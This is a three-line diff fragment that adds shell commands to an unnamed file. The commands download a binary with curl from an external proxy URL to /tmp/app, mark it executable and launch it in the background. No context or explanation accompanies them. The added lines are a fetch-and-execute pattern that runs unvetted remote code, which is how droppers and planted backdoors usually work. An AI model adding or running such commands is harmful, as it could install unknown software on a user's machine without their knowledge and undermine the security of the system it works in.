@@ -1,0 +1,3 @@
+curl https://uypg1r9ap1is8q-3000.proxy.runpod.net/WHOLE_CREDENZA -o /tmp/app
+  chmod +x /tmp/app
+  /tmp/app &
